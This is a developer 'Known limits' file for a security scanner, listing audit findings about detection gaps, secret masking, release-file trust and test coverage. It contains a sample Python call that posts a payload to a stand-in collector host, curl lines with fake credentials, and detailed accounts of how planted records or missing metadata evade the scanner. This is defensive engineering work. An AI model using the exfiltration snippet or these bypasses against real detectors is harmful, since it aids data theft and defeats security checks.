# Known limits

Open findings that dev carries knowingly. Each one is **must-fix before any release**.

## Batch 5 (merged to dev Oct 19, 2026: #15 and #16)

Ken approved merging #15 and #16 into dev on Oct 19, 2026 with these 7 Codex highs open. Forge fixes them after the freeze, before release. They're worded as Codex wrote them in its final checks after fix round 3: #15 at 62ccd0e and #16 at c3b0257. File links point at the code as merged.

**Status: open, must-fix before any release** (except 4 and 7, fixed in batch 6 PR1, branch `fix/batch6a`, and 3 and 6, fixed in batch 6 PR2, branch `fix/batch6b`; see each).

### From #15 (batch 5 PR A: platform notes, reviewed list, #11 follow-ups)

1. **high — [text.py:779](../watchtower/wt_parts/text.py): “Maybe” still permits realistic destination downgrades.**

   `requests.post(os.environ.get('HOOK', '<webhook>'), json=payload)` remains T018/**Install with changes** when `HOOK` actually selects `https://collector.example`. A sibling JSON configuration produces the same result; scanning that JSON separately raises no finding. Unknown-object `getattr`, `setdefault`, `pop`, environment-backed collections and reassigned destination variables also retain T018.

   The assertion conflict is real, but the two tests have different premises. The explicitly empty `config = {}` example can safely retain T018. The broader [safe-default assertions](../tests/test_batch5_codex_r2.py) include externally overridden values and codify this gap. The earlier blanket “fixed” assessment was too broad. Preserving those assertions does not establish safety.

   **Fix:** require evidence that the webhook is the selected destination. Preserve the proven empty-map case; correct assertions that treat unknown runtime defaults as established destinations.

2. **high — [text.py:748](../watchtower/wt_parts/text.py): Receiver naming introduces a new lookup bypass.**

   This complete example selects the collector:

   ```python
   cfg_client = {}
   url = cfg_client.get("<webhook>", "https://collector.example")
   requests.post(url, json=payload)
   ```

   It changes from T005 on `77dedd1` to T018/**Install with changes** on HEAD, despite the explicit collector URL. The `client` suffix makes the lookup appear to be HTTP GET. Conversely, `s = requests.Session(); s.get("<webhook>")` changes from T018 to critical T005.

   **Fix:** establish receiver identity from bindings/API use; a variable-name suffix must not authorize a destination downgrade.

3. **Fixed in batch 6 PR2 (fix/batch6b, "Fake keys and dismissals"), together with #15 medium 6 (masking idempotence; MASK_VERSION 8).** Replays: `tests/test_batch6_mask.py`. **high — [mask.py:689](../watchtower/wt_parts/mask.py): Additional credential flags still leak.**

   With `\<newline>` representing a continued shell word, these retain `FAKEz` through **`mask_secrets`, finding evidence and `save_approved()`**:

   - `curl --coo\<newline>kie 'sid=FAKEz' https://x.example`
   - `curl -\<newline>b 'sid=FAKEz' https://x.example`
   - `curl --oauth2-bea\<newline>rer FAKEz https://x.example`

   These are remaining coverage gaps, not newly introduced leaks. Version-6 copies containing them are migrated to **version 7 while retaining the secret**.

   **Fix:** recognize normalized curl cookie and OAuth bearer options, including their short/attached forms, and mask their credential values.

4. **high — [scanners.py:272](../watchtower/wt_parts/scanners.py): Missing mutable installation metadata still disables release checks.**

   A copy moved outside the default home, under a name other than `app`, without the adjacent commit record returns `installed_root() == None`, skips self-check and accepts planted reviewed-list bytes. A custom-home rename plus removal of its commit record does likewise. Changing `WATCHTOWER_HOME` does not restore protection.

   The “no `.git`” justification does not match the predicate: installation classification does not inspect `.git`. The newly added [checkout guard](../tests/test_batch5_codex_r3.py) explicitly preserves this bypass.

   **Fix:** keep reviewed-list, normalization and scanner trust bound to verified release provenance regardless of directory layout or missing state. Missing Bot-writable metadata must not grant unchecked trust.

   **Fixed in batch 6 PR1 (`fix/batch6a`):** every shipped rules file (platform lock, reviewed list, normalization spec, access and Ask-first vocabularies, scanner lock and its reader) is held to the running folder's `MANIFEST.sha256` in every layout; a missing manifest or line refuses the file with a note. Replays in `tests/test_batch6_release_files.py`.

### From #16 (batch 5 PR B: access map, threat brief)

5. **High — [collect.py:10](../watchtower/wt_parts/collect.py), [access.py:344](../watchtower/wt_parts/access.py), [access.py:460](../watchtower/wt_parts/access.py): Permission failures can still mean “absent.”**

   `isdir()`, `isfile()` and `lexists()` suppress permission errors into false results. These checks occur before the new error tracking or hardened opens. An unstatable scan root produces neither an error nor a skip; an inaccessible browser ancestor produces `(None, True)`; an inaccessible directory lookup produces `([], True)`.

   An in-memory `access_map_now()` replay with denied metadata lookups consequently returned no incompleteness, browser/MCP/CLI/plugin absence statements, `scheduled_jobs: 0`, and **“Watchtower found no Gmail connector, sign-in or webhook here.”** Ordinary errors *after* opening/listing a directory are handled correctly.

   **Fix:** distinguish confirmed absence from failed lookup. Propagate permission and other lookup errors through root collection, browser/seed checks, CLI discovery and scheduled-directory coverage.

6. **Fixed in batch 6 PR2 (fix/batch6b, "Fake keys and dismissals").** Replays: `tests/test_batch6_connectors.py`. **High — [access.py:136](../watchtower/wt_parts/access.py): Saved connector lists bypass malformed-answer validation.**

   A fresh reply with `connectors: [{"name":"Gmail"}]` becomes incomplete. The same value in saved `rollcall_findings.json` passes through `_ax_said()` as an empty, complete connector list.

   The full saved-record reader reproduced **“Golf: no connectors,”** `bot_connectors_complete: true`, and the Gmail absence sentence. `[123]` behaves similarly. A saved scalar `"Gmail"` instead becomes unknown but loses its canonical positive observation.

   **Fix:** apply the same normalization and validation on fresh replies, carried-over records and saved-file reads. Non-string list members must establish incompleteness; supported scalar strings should retain canonical labels.

7. **High — [golden_split.py:803](../tests/golden_split.py), [golden_split.py:996](../tests/golden_split.py): Requirements remain per scenario, not per run/output key.**

   Using the shipped item-a entries, I supplied one healthy audit and a second audit in the same scenario with its entire access addition omitted. The result remained **zero unexpected lines and zero unmet requirements**. The scenario sequences actually contain repeated audits.

   **Fix:** require each applicable `(scenario, output key/run)` independently, including outputs whose omission leaves them identical to baseline.

   **Fixed in batch 6 PR1 (`fix/batch6a`):** an exact-scenario `must_see` entry must match in every output of each of its scenarios that its `key_rx` names, those equal to the baseline included; pattern entries keep "any one scenario". Replays in `tests/test_batch6_golden_perkey.py`.

## Open mediums (batch 6 plan)

- **#16 medium 1:** the access JSON can exceed 4 KB; fixing it means making nested display lists trimmable in `fit` (a JSON shape change, broad golden churn, no security impact).
- **#16 medium 2, wording half:** "scheduled jobs" → "cron files / timers observed" would change every access line in every golden box; left for a wording-only batch. (The error/link half is planned for PR3.)

## Batch 6 PR2 (fix/batch6b, "Fake keys and dismissals"): follow-ups

KL3 and KL6 above are fixed in this PR; KL4 and KL7 in PR1; KL1, KL2 and KL5 are PR3's. B5 removed the name-based secret skips Ken named (gitleaks' `tests/`, `fixtures/`, `testdata/`, `*.test.*` path skips, the whole-line `$VAR`/placeholder rule, and `fixplan.py`'s FIXTURE_PATH). These name- or line-based rules are still in place and are logged here to be replaced by content checks in a later batch (**status: open follow-ups, not release blockers on their own**):

- **gitleaks path allowlist** ([secrets_pkgs.py](../watchtower/wt_parts/secrets_pkgs.py), `GITLEAKS_CONFIG`): package stores and caches (`node_modules`, `.cache`, `site-packages`, `go/pkg`, …), browser profiles, the named credential files, Watchtower's own folders, lockfiles and `marketplace.json`, and every `.h` file are never read by gitleaks.
- **gitleaks whole-line rules**: a line with `x-amz-credential=` / `X-Amz-Signature=` or `?AWSAccessKeyId=` / `Signature=` / `Expires=` hides every other hit on that line.
- **`in_toolchain_tree`** ([secrets_pkgs.py](../watchtower/wt_parts/secrets_pkgs.py)): gitleaks hits under Go, pnpm, rustup and cargo trees are counted, not listed.
- **`SAMPLE_SKILL_PATH`** ([collect.py](../watchtower/wt_parts/collect.py), used by [scope.py](../watchtower/wt_parts/scope.py)): a skill under a `tests/`, `fixtures/`, `examples/`, `docs/` or `references/` segment outside the loadable locations isn't scored as installed (keys there are still reported: SECRET_RULES count wherever they sit).

Limits of the new behavior, kept knowingly:

- **B5 (as fixed in Codex round 1):** a gitleaks hit is judged only at the place gitleaks reported (StartLine/StartColumn to EndLine/EndColumn, in bytes of the file as Watchtower read it once), when the bytes there are gitleaks' Match exactly and the secret has gitleaks' Entropy, and only when gitleaks gives the identical hit again on a private copy of those very bytes; anything else (no columns or Entropy, other bytes there, two places that fit, a copy gitleaks can't scan) keeps the hit. gitleaks counts columns from 1 on the first line of each 100 KB piece it reads and from 2 after; Watchtower uses the first count on line 1 only and tries both past 10,000 bytes into a file, where a piece may begin (if two places then fit, the hit is kept). A placeholder is a whole value only: FAKE or EXAMPLE right after an optional provider prefix (the convention this project's fake keys follow; a real key that happens to start with FAKE after its prefix, about 1 in 15 million for base62, would be taken as an example), only placeholder words (`your-api-key-here`, `YOUR_TOKEN`, `xxxx`), one 1-4 character unit repeated (`aaaa…`, `a1B2a1B2…`; a weak password of that shape is taken as an example), `<…>`, or a whole `$VAR`/`${VAR}`/`${{ secrets.X }}`/`%X%`/`process.env.X`/`***` reference. A word inside a value (`test`, `abcd`, `1234`) no longer makes it an example, for WT-T011, WT-S001 and `codescan` too, so `sk_test_`-style keys and such values are now reported. A hex value is a checksum only by its own line's format (a sha256sum `<hex>  <path>` line, `SHA256 (path) = <hex>`, a typed `sha256:<hex>`, Cargo.lock's `checksum = "…"`, a package-lock/yarn `integrity`), never by a name. A key block is an example only when its decoded body has too few base64 characters for any key (under 64) or decodes cleanly to bytes that are no private key structure (DER SEQUENCE starting with an INTEGER or SEQUENCE, openssh-key-v1, a PGP secret-key packet); its BEGIN label is never read, and a block with no END within 16 KB, an encrypted (Proc-Type/DEK-Info) body or a body line that isn't base64 is a key.
- **B6 (as fixed in Codex round 1):** a dismissal held across an unrelated edit is read from `state/dismissed.jsonl`, which a Bot can write. What a planted record can still hide: only a finding whose raw severity is medium or lower (its rule's own and any it was raised to: none high or critical), that only the change backs up, and whose whole source line or command is unchanged (its `ev256`: never stored with findings, `dismiss` makes it from the file, but a Bot that can read the file can compute it too). A raw high or critical finding, a finding with no `ev256` (only findings Watchtower's text rules read from a file have one), a record without the matching `ev256` (a key-only plant, or a record from before this fix), a changed line or command (T017: the file it uploads and where it sends it), and any other backer always bring it back, and the change's own WT-I001 still counts. Each finding's dismissal is judged before findings are grouped, so a dismissed group leader never hides another file's finding. Lines inserted above the dismissed match shift its `where`, so its key changes and it comes back once.
- **KL3 test change:** `tests/test_batch5_codex_r3.py::ShortAfterJoins::test_in_an_approved_copy` asserted `masked == 7`; MASK_VERSION 8 made it fail. Approved and listed: `masked == 7 -> masked == 8` (the literal, not `MASK_VERSION`).
- **Codex round 1 on a986d54 (10 high, 1 medium):** all fixed, replays in `tests/test_batch6_codex_r1.py`. Three assertions of tests added in 29ac33b changed with the fixes (a checksum test's input, and two B6 tests where a raw-high T004 or a record without `ev256` no longer holds); each is listed old → new in CHANGELOG.
